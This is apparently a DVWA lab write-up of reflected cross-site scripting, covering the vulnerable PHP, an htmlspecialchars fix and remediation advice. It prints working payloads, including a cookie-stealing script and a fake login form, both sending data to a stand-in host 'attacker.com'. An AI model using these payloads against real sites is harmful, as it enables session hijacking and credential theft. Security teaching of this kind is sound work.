## Overview

| Field | Detail |
|---|---|
| **Vulnerability** | Reflected Cross-Site Scripting (XSS) |
| **Security Level** | Low |
| **Method** | GET parameter injection via `name` field |

---

## What is Reflected XSS?

Reflected XSS occurs when user-supplied input is immediately returned by the server in the HTTP response without being sanitized or encoded. The malicious payload is embedded in a crafted URL — when a victim clicks the link, their browser executes the attacker's script in the context of the trusted site.

Unlike Stored XSS, the payload is never saved to the database. It lives in the URL and only executes when the link is visited.

---

## Vulnerable Source Code

```php
<?php

if(!array_key_exists("name", $_GET) || $_GET['name'] == NULL || $_GET['name'] == ''){
    $isempty = true;
} else {
    echo '<pre>';
    echo 'Hello ' . $_GET['name'];  // Vulnerable line — no sanitization
    echo '</pre>';
}

?>
```

### Why this is vulnerable

The `$_GET['name']` value is concatenated directly into the HTML output with no encoding or filtering applied. Whatever the user submits is rendered by the browser as raw HTML/JavaScript.

The fix would be a single function call:

```php
echo 'Hello ' . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars()` converts `<` to `&lt;` and `>` to `&gt;`, neutralizing any injected tags before they reach the DOM.

---

## Exploitation

### Phase 1 — Proof of Concept (JS Execution)

**Payload:**
```html
<script>alert('XSS')</script>
```

**URL:**
```
http://<target>/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

**Result:** Alert box fires with the text `XSS`, confirming JavaScript executes in the page context.

---

### Phase 2 — Cookie Harvesting

**Payload:**
```html
<script>alert(document.cookie)</script>
```

**Result:** Alert box exposes the live session cookie:

```
security=low; PHPSESSID=78317d5aa8ecd05a774eb846ca7dc92b
```

In a real attack, the payload would exfiltrate the cookie to an attacker-controlled server:

```html
<script>
  document.location='http://attacker.com/steal?c='+document.cookie;
</script>
```

The attacker replays the stolen `PHPSESSID` to hijack the authenticated session — no password required.

---

### Phase 3 — DOM Manipulation

#### Step 1 — Basic HTML Injection

**Payload:**
```html
<h1>Hacked</h1>
```

**Result:** The browser rendered the injected tag as a real heading inside the DVWA response box, confirming full HTML injection.

#### Step 2 — Fake Login Form (Phishing Simulation)

**Payload:**
```html
<form action="http://attacker.com/steal" method="GET">
<h3>Session Expired. Please login again.</h3>
<input name="user" placeholder="Username"/><br/>
<input name="pass" type="password" placeholder="Password"/><br/>
<input type="submit" value="Login"/>
</form>
```

**Result:** A convincing fake login form rendered inside the legitimate DVWA page, on a domain the victim trusts. Submitted credentials are sent directly to the attacker's server.

---

## Impact Summary

| Attack | Impact |
|---|---|
| JS execution | Arbitrary code runs in victim's browser |
| Cookie theft | Session hijacking without credentials |
| HTML injection | Full page content manipulation |
| Fake login form | Credential phishing on a trusted domain |

---

## Root Cause

No output encoding on user-supplied data before it is rendered in the HTML response.

## Remediation

| Fix | Implementation |
|---|---|
| Output encoding | `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')` |
| Input validation | Whitelist expected characters (e.g. alphanumeric only) |
| Content Security Policy | CSP header restricts inline script execution |

---
